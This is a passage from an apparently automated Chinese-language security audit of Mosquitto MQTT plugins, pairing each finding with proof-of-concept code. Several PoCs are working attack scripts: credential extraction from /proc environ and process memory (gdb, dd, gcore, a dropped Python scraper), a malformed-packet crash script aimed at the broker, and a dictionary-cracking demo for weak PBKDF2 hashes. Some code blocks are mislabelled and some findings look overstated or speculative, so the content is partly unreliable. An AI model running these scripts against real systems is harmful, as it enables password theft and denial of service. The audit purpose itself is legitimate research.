void cJSON_Delete(cJSON *item) {
    free(item);
}

/* 模拟mosquitto_property_identifier */
int mosquitto_property_identifier(const mosquitto_property *prop) {
    return prop->identifier;
}

/* 模拟mosquitto_property_next */
const mosquitto_property* mosquitto_property_next(const mosquitto_property *prop) {
    return prop->next;
}

/* 模拟mosquitto_property_identifier_to_string */
const char* mosquitto_property_identifier_to_string(int id) {
    (void)id;
    return "USER_PROPERTY";
}

/* 定义MQTT属性常量 */
#define MQTT_PROP_USER_PROPERTY 0x26

/* 漏洞函数 - 从原始代码复制，仅修改函数名避免冲突 */
cJSON *vulnerable_mosquitto_properties_to_json(const mosquitto_property *properties)
{
    cJSON *array, *obj;
    char *name, *value;  /* 未初始化的局部变量 */
    uint8_t i8;
    uint16_t len;
    int propid;

    if(!properties){
        return NULL;
    }

    array = cJSON_CreateArray();
    if(!array){
        return NULL;
    }

    do{
        propid = mosquitto_property_identifier(properties);
        obj = cJSON_CreateObject();
        if(!obj){
            cJSON_Delete(array);
            return NULL;
        }
        cJSON_AddItemToArray(array, obj);
        
        if(cJSON_AddStringToObject(obj,
                "identifier",
                mosquitto_property_identifier_to_string(propid)) == NULL
                ){
            cJSON_Delete(array);
            return NULL;
        }

        switch(propid){
            case MQTT_PROP_USER_PROPERTY:
                /* 漏洞点: 没有检查返回值 */
                mosquitto_property_read_string_pair(properties, propid, &name, &value, false);
                
                /* 如果上面函数返回失败，name和value可能未初始化 */
                /* 这里直接使用未初始化的指针 */
                if(cJSON_AddStringToObject(obj, "name", name) == NULL
                        || cJSON_AddStringToObject(obj, "value", value) == NULL){
                    /* 这里也会对未初始化指针执行free */
                    free(name);
                    free(value);
                    cJSON_Delete(array);
                    return NULL;
                }
                /* 这里也会对未初始化指针执行free */
                free(name);
                free(value);
                break;

            default:
                break;
        }

        properties = mosquitto_property_next(properties);
    }while(properties);

    return array;
}

int main() {
    printf("=== PoC: 未初始化变量使用漏洞 (VULN-A7360C60) ===\n");
    printf("仅供研究使用\n\n");
    
    /* 创建模拟的MQTT属性链 */
    mosquitto_property prop;
    prop.identifier = MQTT_PROP_USER_PROPERTY;
    prop.value = NULL;
    prop.next = NULL;
    
    printf("创建包含USER_PROPERTY属性的MQTT消息...\n");
    printf("调用漏洞函数 mosquitto_properties_to_json()...\n\n");
    
    /* 调用漏洞函数 */
    cJSON *result = vulnerable_mosquitto_properties_to_json(&prop);
    
    if(result) {
        printf("函数返回了非NULL结果\n");
        printf("注意: 在实际环境中，此调用可能导致:\n");
        printf("  1. 使用未初始化指针 -> 程序崩溃 (段错误)\n");
        printf("  2. 释放未初始化指针 -> 双重释放或释放野指针\n");
        printf("  3. 可能的信息泄露 (如果未初始化指针指向敏感数据)\n");
        cJSON_Delete(result);
    } else {
        printf("函数返回NULL (可能已崩溃或返回错误)\n");
    }
    
    printf("\n=== PoC执行完毕 ===\n");
    return 0;
}

/*
 * 编译方法:
 * gcc -o poc_vuln_A7360C60 poc_vuln_A7360C60.c -lmosquitto -lcjson
 * 
 * 注意: 实际触发需要mosquitto库支持，且需要构造特定的MQTT消息
 * 使mosquitto_property_read_string_pair()返回失败
 */
```

---

### VULN-AF9AB559 - 不安全的密码哈希迭代次数

- **严重等级:** HIGH
- **文件位置:** `libcommon/password_common.c:50`
- **数据流:** PW_DEFAULT_ITERATIONS 在 pw__create_sha512_pbkdf2 函数中被用作默认迭代次数
- **判断理由:** PBKDF2的默认迭代次数仅为1000次，远低于当前安全标准（建议至少100000次）。这会导致密码哈希容易被暴力破解或字典攻击。

**代码片段:**
```
#define PW_DEFAULT_ITERATIONS 1000
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC: 不安全的密码哈希迭代次数 (PBKDF2迭代次数过低)
漏洞ID: VULN-AF9AB559
仅供研究使用 - 请勿用于非法用途
"""

import hashlib
import base64
import os
import time
from typing import Tuple

# 模拟漏洞环境中的弱迭代次数
WEAK_ITERATIONS = 1000  # 漏洞代码中的PW_DEFAULT_ITERATIONS
STRONG_ITERATIONS = 100000  # 当前安全标准建议值

def generate_password_hash(password: str, salt: bytes, iterations: int) -> bytes:
    """模拟PBKDF2-SHA512密码哈希生成"""
    return hashlib.pbkdf2_hmac(
        'sha512',
        password.encode('utf-8'),
        salt,
        iterations,
        dklen=64  # SHA512输出长度
    )

def crack_password_bruteforce(target_hash: bytes, salt: bytes, iterations: int, 
                              wordlist: list) -> Tuple[bool, str, float]:
    """
    模拟暴力破解过程
    演示低迭代次数如何加速破解
    """
    start_time = time.time()
    attempts = 0
    
    for password in wordlist:
        attempts += 1
        computed_hash = generate_password_hash(password, salt, iterations)
        
        if computed_hash == target_hash:
            elapsed = time.time() - start_time
            return (True, password, elapsed)
    
    elapsed = time.time() - start_time
    return (False, "", elapsed)

def demonstrate_weak_iterations():
    """演示弱迭代次数的安全影响"""
    print("=" * 60)
    print("PoC: 不安全的密码哈希迭代次数 (VULN-AF9AB559)")
    print("仅供研究使用 - 请勿用于非法用途")
    print("=" * 60)
    
    # 测试密码
    test_password = "MySecureP@ss123"
    
    # 生成随机盐
    salt = os.urandom(32)
    
    print(f"\n[1] 测试密码: {test_password}")
    print(f"[2] 盐值 (hex): {salt.hex()[:32]}...")
    
    # 生成弱迭代次数的哈希
    weak_hash = generate_password_hash(test_password, salt, WEAK_ITERATIONS)
    print(f"[3] 弱迭代次数 ({WEAK_ITERATIONS}) 哈希: {weak_hash.hex()[:32]}...")
    
    # 生成强迭代次数的哈希
    strong_hash = generate_password_hash(test_password, salt, STRONG_ITERATIONS)
    print(f"[4] 强迭代次数 ({STRONG_ITERATIONS}) 哈希: {strong_hash.hex()[:32]}...")
    
    # 模拟破解性能对比
    print("\n" + "-" * 60)
    print("性能对比分析:")
    print("-" * 60)
    
    # 测试单个密码的哈希时间
    weak_time = timeit_single_hash(test_password, salt, WEAK_ITERATIONS)
    strong_time = timeit_single_hash(test_password, salt, STRONG_ITERATIONS)
    
    print(f"\n单个密码哈希时间:")
    print(f"  弱迭代次数 ({WEAK_ITERATIONS}): {weak_time:.6f} 秒")
    print(f"  强迭代次数 ({STRONG_ITERATIONS}): {strong_time:.6f} 秒")
    print(f"  速度差异: {strong_time/weak_time:.1f}x")
    
    # 模拟字典攻击
    print("\n" + "-" * 60)
    print("模拟字典攻击 (使用常见密码列表):")
    print("-" * 60)
    
    # 模拟常见密码字典
    wordlist = [
        "password",
        "123456",
        "qwerty",
        "admin",
        "letmein",
        "welcome",
        "monkey",
        "dragon",
        "master",
        "sunshine",
        "princess",
        "football",
        "iloveyou",
        "trustno1",
        "MySecureP@ss123",  # 正确密码
        "Passw0rd!",
        "Summer2023",
        "Winter2023",
        "Changeme123",
        "P@ssw0rd"
    ]
    
    print(f"\n字典大小: {len(wordlist)} 个密码")
    
    # 使用弱迭代次数破解
    print("\n[弱迭代次数破解]")
    found, password, elapsed = crack_password_bruteforce(
        weak_hash, salt, WEAK_ITERATIONS, wordlist
    )
    if found:
        print(f"  ✓ 密码已找到: {password}")
        print(f"  ✓ 耗时: {elapsed:.4f} 秒")
    else:
        print(f"  ✗ 密码未找到, 耗时: {elapsed:.4f} 秒")
    
    # 使用强迭代次数破解
    print("\n[强迭代次数破解]")
    found, password, elapsed = crack_password_bruteforce(
        strong_hash, salt, STRONG_ITERATIONS, wordlist
    )
    if found:
        print(f"  ✓ 密码已找到: {password}")
        print(f"  ✓ 耗时: {elapsed:.4f} 秒")
    else:
        print(f"  ✗ 密码未找到, 耗时: {elapsed:.4f} 秒")
    
    # 安全影响总结
    print("\n" + "=" * 60)
    print("安全影响分析:")
    print("=" * 60)
    print(f"""
1. 漏洞描述:
   - PBKDF2迭代次数设置为 {WEAK_ITERATIONS} 次
   - 远低于当前安全标准建议的 {STRONG_ITERATIONS}+ 次

2. 攻击向量:
   - 离线暴力破解: 攻击者可获取密码哈希后离线破解
   - 字典攻击: 低迭代次数使每秒可尝试的密码数量增加
   - GPU加速: 现代GPU可并行计算大量哈希

3. 影响评估:
   - 破解速度提升: ~{strong_time/weak_time:.0f}x (基于当前测试)
   - 实际场景中, 使用GPU集群可达到数百万次/秒的哈希计算
   - 弱密码(如常见密码)可在数秒内被破解

4. 修复建议:
   - 将迭代次数提升至至少 {STRONG_ITERATIONS} 次
   - 考虑使用自适应哈希算法(如bcrypt, argon2)
   - 实施密码复杂度策略
   - 添加登录尝试限制和速率控制
""")

def timeit_single_hash(password: str, salt: bytes, iterations: int, 
                       repeat: int = 100) -> float:
    """测量单次哈希的平均时间"""
    start = time.time()
    for _ in range(repeat):
        generate_password_hash(password, salt, iterations)
    return (time.time() - start) / repeat

if __name__ == "__main__":
    demonstrate_weak_iterations()
```

---

### VULN-1626FB30 - 硬编码凭证/环境变量密码泄露

- **严重等级:** HIGH
- **文件位置:** `plugins\examples\auth-by-env\mosquitto_auth_by_env.c:28`
- **数据流:** 环境变量MOSQUITTO_PASSWORD -> getenv() -> mosquitto_strdup() -> environment_password全局变量 -> basic_auth_callback()中与用户密码比较
- **判断理由:** 该插件使用单一环境变量作为所有用户的共享密码，存在严重安全隐患：1) 所有用户使用相同密码，无法区分用户身份；2) 环境变量在进程内存中可被其他进程读取；3) 密码以明文形式存储在全局变量environment_password中，可能被内存转储泄露；4) 缺乏密码轮换机制和审计日志

**代码片段:**
```
#define ENV_MOSQUITTO_PASSWORD "MOSQUITTO_PASSWORD"
```

**PoC代码:**
```python
#!/bin/bash
# 仅供研究使用 - 硬编码凭证/环境变量密码泄露 PoC
# 漏洞: Mosquitto auth-by-env 插件使用单一环境变量作为共享密码

# PoC 1: 环境变量泄露 - 通过 /proc 文件系统读取其他进程的环境变量
# 前置条件: 攻击者具有本地用户权限，可以访问 /proc 文件系统

echo "=== PoC 1: 通过 /proc 文件系统泄露环境变量 ==="
echo "[!] 仅供研究使用"
echo ""

# 查找运行 Mosquitto 的进程
MOSQUITTO_PID=$(pgrep -x mosquitto 2>/dev/null || pgrep -f "mosquitto -c" 2>/dev/null)

if [ -z "$MOSQUITTO_PID" ]; then
    echo "[-] 未找到 Mosquitto 进程"
    echo "[*] 尝试查找其他可能加载该插件的进程..."
    # 尝试查找任何可能使用该插件的进程
    for pid in /proc/[0-9]*/cmdline; do
        if grep -q "mosquitto_auth_by_env" "$pid" 2>/dev/null; then
            MOSQUITTO_PID=$(echo "$pid" | cut -d'/' -f3)
            break
        fi
    done
fi

if [ -n "$MOSQUITTO_PID" ]; then
    echo "[+] 找到 Mosquitto 进程 PID: $MOSQUITTO_PID"
    echo "[*] 尝试读取环境变量..."
    
    # 读取进程环境变量
    if [ -r "/proc/$MOSQUITTO_PID/environ" ]; then
        echo "[+] 成功读取环境变量:"
        cat "/proc/$MOSQUITTO_PID/environ" | tr '\0' '\n' | grep -i "MOSQUITTO_PASSWORD" || echo "[-] 未找到 MOSQUITTO_PASSWORD 环境变量"
    else
        echo "[-] 权限不足，无法读取 /proc/$MOSQUITTO_PID/environ"
        echo "[*] 尝试使用 sudo 或作为 root 运行"
    fi
else
    echo "[-] 未找到相关进程"
fi

echo ""
echo "=== PoC 2: 内存转储泄露密码 ==="
echo "[!] 仅供研究使用"
echo ""

# 模拟内存转储攻击
if [ -n "$MOSQUITTO_PID" ] && [ -r "/proc/$MOSQUITTO_PID/mem" ]; then
    echo "[+] 尝试从进程内存中提取密码..."
    # 读取进程内存映射
    cat "/proc/$MOSQUITTO_PID/maps" 2>/dev/null | head -20
    echo ""
    echo "[*] 密码存储在全局变量 environment_password 中"
    echo "[*] 可以通过 gdb 或内存分析工具提取"
    echo "[*] 示例: gdb -p $MOSQUITTO_PID -batch -ex 'x/s environment_password'"
else
    echo "[-] 无法访问进程内存"
fi

echo ""
echo "=== PoC 3: 利用共享密码进行未授权访问 ==="
echo "[!] 仅供研究使用"
echo ""

# 模拟攻击者获取密码后的利用
if [ -z "$MOSQUITTO_PASSWORD" ]; then
    echo "[*] 当前环境未设置 MOSQUITTO_PASSWORD"
    echo "[*] 如果攻击者获取了密码，可以执行以下操作:"
    echo ""
    echo "    # 使用任意用户名连接 MQTT Broker"
    echo "    mosquitto_pub -h broker.example.com -t 'test/topic' -m 'Hello' -u 'anyuser' -P '<泄露的密码>'"
    echo ""
    echo "    # 订阅所有主题"
    echo "    mosquitto_sub -h broker.example.com -t '#' -u 'anyuser' -P '<泄露的密码>'"
    echo ""
    echo "    # 使用 Python 连接"
    echo "    import paho.mqtt.client as mqtt"
    echo "    client = mqtt.Client()"
    echo "    client.username_pw_set('anyuser', '<泄露的密码>')"
    echo "    client.connect('broker.example.com', 1883)"
    echo "    client.publish('sensitive/topic', 'data')"
else
    echo "[+] 当前环境已设置 MOSQUITTO_PASSWORD"
    echo "[!] 警告: 所有用户使用相同密码: $MOSQUITTO_PASSWORD"
fi

echo ""
echo "=== 漏洞影响分析 ==="
echo "1. 所有用户共享同一密码，无法区分用户身份"
echo "2. 密码以明文形式存储在进程内存中"
echo "3. 可通过 /proc 文件系统或内存转储泄露"
echo "4. 缺乏密码轮换机制"
echo "5. 缺乏审计日志"
echo "6. 任何知道密码的人可以冒充任何用户"
```

---

### VULN-F6717ACB - 密码以明文形式存储在内存中

- **严重等级:** MEDIUM
- **文件位置:** `plugins\examples\auth-by-env\mosquitto_auth_by_env.c:31`
- **数据流:** 环境变量 -> getenv() -> mosquitto_strdup() -> environment_password全局指针
- **判断理由:** 密码以明文形式存储在全局变量中，进程生命周期内一直驻留在内存。攻击者通过/proc/pid/mem或核心转储可获取密码。应使用后立即清零敏感内存区域，或使用安全内存分配函数

**代码片段:**
```
static char *environment_password = NULL;
```

**PoC代码:**
```python
#!/bin/bash
# 仅供研究使用 - 密码明文存储漏洞PoC
# 针对Mosquitto auth-by-env插件

# PoC 1: 通过/proc/pid/mem读取密码
# 前置条件：攻击者拥有与mosquitto进程相同的用户权限或root权限

echo "[+] 查找mosquitto进程PID"
MOSQUITTO_PID=$(pgrep -f mosquitto | head -1)
if [ -z "$MOSQUITTO_PID" ]; then
    echo "[-] 未找到mosquitto进程"
    exit 1
fi
echo "[+] Mosquitto PID: $MOSQUITTO_PID"

# 方法1: 使用gdb读取全局变量
echo "[+] 方法1: 使用gdb读取environment_password"
sudo gdb -batch -ex "attach $MOSQUITTO_PID" -ex "print environment_password" -ex "detach" 2>/dev/null || echo "[-] gdb方法失败"

# 方法2: 直接搜索内存中的密码字符串
echo "[+] 方法2: 搜索内存中的密码模式"
# 假设密码以环境变量名开头，搜索MOSQUITTO_PASSWORD附近的内存
sudo cat /proc/$MOSQUITTO_PID/maps 2>/dev/null | while read line; do
    addr=$(echo $line | awk '{print $1}' | cut -d'-' -f1)
    end=$(echo $line | awk '{print $1}' | cut -d'-' -f2)
    perms=$(echo $line | awk '{print $2}')
    if [[ $perms == *"rw"* ]]; then
        # 读取可写内存区域
        sudo dd if=/proc/$MOSQUITTO_PID/mem bs=1 skip=$((0x$addr)) count=$((0x$end - 0x$addr)) 2>/dev/null | strings | grep -E '.{8,}' | head -20
    fi
done

# PoC 2: 核心转储分析
echo "[+] 方法3: 生成核心转储并分析"
sudo gcore $MOSQUITTO_PID 2>/dev/null && mv core.$MOSQUITTO_PID /tmp/mosquitto_core
if [ -f /tmp/mosquitto_core ]; then
    strings /tmp/mosquitto_core | grep -E '.{8,}' | head -20
    rm /tmp/mosquitto_core
fi

# PoC 3: Python脚本读取内存
cat << 'PYEOF' > /tmp/read_mosquitto_pass.py
#!/usr/bin/env python3
# 仅供研究使用
import os
import sys

def read_process_memory(pid):
    """读取进程内存中的密码"""
    try:
        with open(f"/proc/{pid}/maps", "r") as maps_file:
            maps_content = maps_file.read()
        
        with open(f"/proc/{pid}/mem", "rb") as mem_file:
            for line in maps_content.split("\n"):
                if not line:
                    continue
                parts = line.split()
                if len(parts) < 2:
                    continue
                addr_range = parts[0]
                perms = parts[1]
                if "r" in perms and "w" in perms:
                    start, end = [int(x, 16) for x in addr_range.split("-")]
                    mem_file.seek(start)
                    try:
                        data = mem_file.read(end - start)
                        # 查找可能的密码字符串（非空、可打印字符）
                        strings = []
                        current = b""
                        for byte in data:
                            if 32 <= byte <= 126:
                                current += bytes([byte])
                            else:
                                if len(current) >= 8:
                                    strings.append(current.decode('ascii', errors='ignore'))
                                current = b""
                        for s in strings:
                            print(f"[+] 发现潜在密码: {s}")
                    except (OSError, ValueError):
                        pass
    except Exception as e:
        print(f"[-] 错误: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("用法: python3 read_mosquitto_pass.py <PID>")
        sys.exit(1)
    read_process_memory(int(sys.argv[1]))
PYEOF
chmod +x /tmp/read_mosquitto_pass.py
echo "[+] Python PoC已创建: /tmp/read_mosquitto_pass.py"
echo "[+] 运行: python3 /tmp/read_mosquitto_pass.py $MOSQUITTO_PID"
```

---

### VULN-4DE17CF4 - 空指针解引用

- **严重等级:** HIGH
- **文件位置:** `plugins\examples\auth-by-ip\mosquitto_auth_by_ip.c:56`
- **数据流:** mosquitto_client_address()返回值直接传递给strcmp()
- **判断理由:** 代码未检查mosquitto_client_address()的返回值是否为NULL。如果该函数返回NULL（例如在异常情况下），strcmp()将尝试解引用空指针，导致程序崩溃。这可能导致拒绝服务攻击。

**代码片段:**
```
ip_address = mosquitto_client_address(ed->client);
if(!strcmp(ip_address, "127.0.0.1")){
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC for VULN-4DE17CF4 - Mosquitto auth-by-ip plugin NULL pointer dereference
仅供研究使用 (For research purposes only)
"""

import socket
import time
import sys

# 目标MQTT服务器配置
TARGET_HOST = "127.0.0.1"  # 目标Mosquitto服务器地址
TARGET_PORT = 1883          # MQTT默认端口

def create_malformed_connect_packet():
    """
    构造一个畸形的MQTT CONNECT包，触发异常连接状态
    导致mosquitto_client_address()返回NULL
    """
    # MQTT CONNECT包结构（固定头部 + 可变头部 + 载荷）
    # 固定头部: 0x10 (CONNECT), 剩余长度
    # 可变头部: 协议名, 协议级别, 连接标志, 保活时间
    # 载荷: Client ID
    
    # 构造一个协议名过长的畸形包
    protocol_name = b"\x00" * 100  # 非标准协议名
    protocol_level = b"\x04"       # MQTT 3.1.1
    connect_flags = b"\x02"        # Clean Session
    keep_alive = b"\x00\x0a"       # 10秒
    
    # 构造可变头部
    variable_header = protocol_name + protocol_level + connect_flags + keep_alive
    
    # 构造载荷（Client ID）
    client_id = b"\x00\x05" + b"poc_" + b"A" * 1000  # 超长Client ID
    
    # 计算剩余长度
    remaining_length = len(variable_header) + len(client_id)
    
    # 编码剩余长度（MQTT可变长度编码）
    encoded_length = b""
    while remaining_length > 0:
        digit = remaining_length % 128
        remaining_length //= 128
        if remaining_length > 0:
            digit |= 0x80
        encoded_length += bytes([digit])
    
    # 固定头部
    fixed_header = b"\x10" + encoded_length
    
    return fixed_header + variable_header + client_id

def create_abnormal_disconnect():
    """
    构造一个异常断开连接包，触发内部错误状态
    """
    # MQTT DISCONNECT包
    return b"\xe0\x00"

def exploit_attempt(target_host, target_port):
    """
    尝试触发空指针解引用漏洞
    """
    print(f"[*] 目标: {target_host}:{target_port}")
    print("[*] 仅供研究使用 - For research purposes only")
    
    try:
        # 创建TCP连接
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((target_host, target_port))
        print("[+] TCP连接建立成功")
        
        # 发送畸形CONNECT包
        print("[*] 发送畸形CONNECT包...")
        malformed_packet = create_malformed_connect_packet()
        sock.send(malformed_packet)
        
        # 等待服务器处理
        time.sleep(0.5)
        
        # 发送异常断开包
        print("[*] 发送异常断开包...")
        sock.send(create_abnormal_disconnect())
        
        # 尝试接收响应（如果服务器崩溃，会收到RST或连接关闭）
        try:
            response = sock.recv(1024)
            if response:
                print(f"[!] 收到响应: {response.hex()}")
            else:
                print("[+] 连接被关闭（可能触发崩溃）")
        except socket.timeout:
            print("[+] 连接超时（可能触发崩溃）")
        except ConnectionResetError:
            print("[+] 连接被重置（服务器可能已崩溃）")
        
        sock.close()
        
    except ConnectionRefusedError:
        print("[-] 连接被拒绝 - 目标未运行Mosquitto")
        sys.exit(1)
    except Exception as e:
        print(f"[-] 错误: {e}")
        sys.exit(1)

def mass_connect_attempt(target_host, target_port, count=10):
    """
    批量连接尝试，增加触发概率
    """
    print(f"[*] 开始批量连接尝试 ({count}次)")
    for i in range(count):
        print(f"\n[*] 尝试 #{i+1}")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((target_host, target_port))
            
            # 发送畸形包
            sock.send(create_malformed_connect_packet())
            time.sleep(0.1)
            sock.send(create_abnormal_disconnect())
            
            try:
                sock.recv(1024)
            except:
                pass
            
            sock.close()
            time.sleep(0.2)
        except Exception as e:
            print(f"    [-] 连接失败: {e}")
    
    print("\n[*] 批量尝试完成")

if __name__ == "__main__":
    print("=" * 60)
    print("Mosquitto auth-by-ip 插件空指针解引用漏洞 PoC")
    print("Vulnerability ID: VULN-4DE17CF4")
    print("仅供研究使用 - For research purposes only")
    print("=" * 60)
    
    # 单次尝试
    exploit_attempt(TARGET_HOST, TARGET_PORT)
    
    # 批量尝试（增加触发概率）
    print("\n" + "=" * 60)
    mass_connect_attempt(TARGET_HOST, TARGET_PORT, count=5)
```

---

### VULN-540C5A41 - 资源未清理

- **严重等级:** MEDIUM
- **文件位置:** `plugins/examples/client-lifetime-stats/mosquitto_client_lifetime_stats.c:175`
- **数据流:** 插件清理函数没有释放local_lifetimes哈希表中的所有条目。
- **判断理由:** 当插件卸载时，mosquitto_plugin_cleanup函数被调用，但它没有遍历并释放local_lifetimes哈希表中的所有client结构体。这会导致在插件卸载时，所有仍在哈希表中的客户端连接信息都泄漏了。

**代码片段:**
```
int mosquitto_plugin_cleanup(void *user_data, struct mosquitto_opt *opts, int opt_count)
{
    UNUSED(user_data);
    UNUSED(opts);
    UNUSED(opt_count);

    return MOSQ_ERR_SUCCESS;
}
```

**PoC代码:**
```python
/*
 * PoC代码 - 仅供研究使用
 * 漏洞: Mosquitto插件资源泄漏 (VULN-540C5A41)
 * 文件: plugins/examples/client-lifetime-stats/mosquitto_client_lifetime_stats.c
 * 
 * 此PoC演示了在插件卸载时local_lifetimes哈希表未清理导致的资源泄漏
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <uthash.h>
#include "mosquitto.h"

/* 模拟原始插件的结构体和哈希表 */
struct lifetime_s {
    UT_hash_handle hh;
    char *id;
    time_t connect;
};

/* 模拟全局哈希表 - 与原始插件相同 */
struct lifetime_s *local_lifetimes = NULL;

/* 模拟客户端连接数 */
#define NUM_CONNECTED_CLIENTS 100

/* 
 * PoC步骤1: 模拟客户端连接，填充哈希表
 * 这模拟了callback_connect函数的行为
 */
void simulate_client_connections() {
    printf("[PoC] 模拟 %d 个客户端连接...\n", NUM_CONNECTED_CLIENTS);
    
    for (int i = 0; i < NUM_CONNECTED_CLIENTS; i++) {
        struct lifetime_s *client = malloc(sizeof(struct lifetime_s));
        if (client == NULL) {
            fprintf(stderr, "内存分配失败\n");
            return;
        }
        
        /* 生成客户端ID */
        char id_buf[32];
        snprintf(id_buf, sizeof(id_buf), "client_%d", i);
        client->id = strdup(id_buf);
        client->connect = time(NULL);
        
        /* 添加到哈希表 */
        HASH_ADD_KEYPTR(hh, local_lifetimes, client->id, strlen(client->id), client);
        printf("  添加客户端: %s\n", client->id);
    }
    
    printf("[PoC] 哈希表中现有 %d 个客户端条目\n", HASH_COUNT(local_lifetimes));
}

/* 
 * PoC步骤2: 模拟原始插件清理函数 - 有漏洞版本
 * 这就是原始代码中的mosquitto_plugin_cleanup函数
 */
int vulnerable_cleanup(void *user_data, struct mosquitto_opt *opts, int opt_count) {
    UNUSED(user_data);
    UNUSED(opts);
    UNUSED(opt_count);
    
    printf("[PoC] 执行有漏洞的清理函数...\n");
    printf("[PoC] 警告: 未释放哈希表中的 %d 个条目!\n", HASH_COUNT(local_lifetimes));
    
    /* 原始代码直接返回，没有释放任何资源 */
    return MOSQ_ERR_SUCCESS;
}

/* 
 * PoC步骤3: 修复后的清理函数 - 用于对比
 * 展示了正确的资源释放方式
 */
int fixed_cleanup(void *user_data, struct mosquitto_opt *opts, int opt_count) {
    struct lifetime_s *client, *tmp;
    
    UNUSED(user_data);
    UNUSED(opts);
    UNUSED(opt_count);
    
    printf("[PoC] 执行修复后的清理函数...\n");
    
    /* 遍历并释放所有条目 */
    HASH_ITER(hh, local_lifetimes, client, tmp) {
        HASH_DELETE(hh, local_lifetimes, client);
        printf("  释放客户端: %s\n", client->id);
        free(client->id);
        free(client);
    }
    
    printf("[PoC] 清理完成，剩余条目数: %d\n", HASH_COUNT(local_lifetimes));
    return MOSQ_ERR_SUCCESS;
}

/* 内存泄漏检测辅助函数 */
void check_memory_leak() {
    int remaining = HASH_COUNT(local_lifetimes);
    if (remaining > 0) {
        printf("\n[PoC] 内存泄漏检测: 发现 %d 个未释放的条目!\n", remaining);
        printf("[PoC] 每个条目约占用: sizeof(lifetime_s) + strlen(id) + 1 字节\n");
        printf("[PoC] 总泄漏内存约: %zu 字节\n", 
               (size_t)remaining * (sizeof(struct lifetime_s) + 32));
    } else {
        printf("\n[PoC] 内存泄漏检测: 所有条目已正确释放\n");
    }
}

int main() {
    printf("========================================\n");
    printf("Mosquitto插件资源泄漏 PoC (仅供研究使用)\n");
    printf("漏洞ID: VULN-540C5A41\n");
    printf("========================================\n\n");
    
    /* 步骤1: 模拟客户端连接 */
    simulate_client_connections();
    
    /* 步骤2: 执行有漏洞的清理 */
    printf("\n--- 漏洞利用演示 ---\n");
    vulnerable_cleanup(NULL, NULL, 0);
    
    /* 检测内存泄漏 */
    check_memory_leak();
    
    /* 步骤3: 展示修复后的清理 */
    printf("\n--- 修复方案演示 ---\n");
    fixed_cleanup(NULL, NULL, 0);
    
    /* 再次检测 */
    check_memory_leak();
    
    printf("\n========================================\n");
    printf("PoC执行完毕\n");
    printf("========================================\n");
    
    return 0;
}
```

---

### VULN-ED26637A - 竞态条件

- **严重等级:** MEDIUM
- **文件位置:** `plugins/examples/delayed-auth/mosquitto_delayed_auth.c:55`
- **数据流:** 查找客户端 -> 更新或创建客户端 -> 添加到哈希表
- **判断理由:** 在多线程环境下，对全局哈希表clients的访问没有加锁保护。如果多个线程同时处理同一个客户端的认证请求，可能导致数据竞争，如重复添加客户端或内存泄漏。

**代码片段:**
```
HASH_FIND(hh, clients, id, strlen(id), client);
if(client){
    client->request_time = time(NULL);
}else{
    client = mosquitto_malloc(sizeof(struct client_list));
    ...
    HASH_ADD_KEYPTR(hh, clients, client->id, strlen(client->id), client);
}
```

**PoC代码:**
```python
/*
 * PoC代码 - 仅供研究使用
 * 漏洞: Mosquitto delayed-auth插件竞态条件
 * 文件: plugins/examples/delayed-auth/mosquitto_delayed_auth.c
 * 行号: 55
 * 
 * 此PoC通过模拟多线程并发认证请求来触发竞态条件
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <time.h>

/* 模拟客户端结构体 */
struct client_list {
    char *id;
    time_t request_time;
    int ref_count;  /* 用于检测重复添加 */
};

/* 模拟全局哈希表（简化版） */
#define MAX_CLIENTS 1000
static struct client_list *clients[MAX_CLIENTS];
static int client_count = 0;

/* 模拟HASH_FIND - 线性查找 */
static struct client_list *simulate_hash_find(const char *id) {
    for (int i = 0; i < client_count; i++) {
        if (clients[i] != NULL && strcmp(clients[i]->id, id) == 0) {
            return clients[i];
        }
    }
    return NULL;
}

/* 模拟HASH_ADD_KEYPTR - 添加客户端 */
static int simulate_hash_add(struct client_list *client) {
    if (client_count >= MAX_CLIENTS) {
        return -1;
    }
    clients[client_count++] = client;
    return 0;
}

/* 模拟basic_auth_callback - 存在竞态条件的版本 */
static int vulnerable_basic_auth_callback(const char *id) {
    struct client_list *client;
    
    /* 竞态条件窗口: 多个线程可能同时通过此检查 */
    client = simulate_hash_find(id);
    if (client) {
        client->request_time = time(NULL);
    } else {
        /* 多个线程可能同时执行此处的创建操作 */
        client = (struct client_list *)malloc(sizeof(struct client_list));
        if (client == NULL) {
            return -1;
        }
        
        client->id = strdup(id);
        if (client->id == NULL) {
            free(client);
            return -1;
        }
        client->request_time = time(NULL);
        client->ref_count = 1;
        
        /* 竞态条件窗口: 多个线程可能同时添加同一个客户端 */
        simulate_hash_add(client);
        
        printf("[线程 %lu] 创建新客户端: %s (当前客户端数: %d)\n", 
               pthread_self(), id, client_count);
    }
    
    return 0;
}

/* 线程工作函数 - 模拟并发认证请求 */
typedef struct {
    const char *client_id;
    int thread_id;
} thread_arg_t;

static void *worker_thread(void *arg) {
    thread_arg_t *targ = (thread_arg_t *)arg;
    
    /* 每个线程发送多次请求 */
    for (int i = 0; i < 5; i++) {
        printf("[线程 %d] 发送认证请求: %s (第%d次)\n", 
               targ->thread_id, targ->client_id, i + 1);
        
        vulnerable_basic_auth_callback(targ->client_id);
        
        /* 随机延迟以增加竞态条件概率 */
        usleep(rand() % 1000);
    }
    
    return NULL;
}

/* 检测重复客户端的函数 */
static int detect_duplicates(void) {
    int duplicates = 0;
    
    for (int i = 0; i < client_count; i++) {
        if (clients[i] == NULL) continue;
        
        for (int j = i + 1; j < client_count; j++) {
            if (clients[j] != NULL && 
                strcmp(clients[i]->id, clients[j]->id) == 0) {
                printf("[漏洞触发] 发现重复客户端: %s (位置 %d 和 %d)\n", 
                       clients[i]->id, i, j);
                clients[j]->ref_count++;
                duplicates++;
            }
        }
    }
    
    return duplicates;
}

int main(void) {
    printf("=========================================================\n");
    printf(" Mosquitto delayed-auth 竞态条件 PoC\n");
    printf(" 仅供研究使用 - VULN-ED26637A\n");
    printf("=========================================================\n\n");
    
    srand(time(NULL));
    
    /* 初始化客户端数组 */
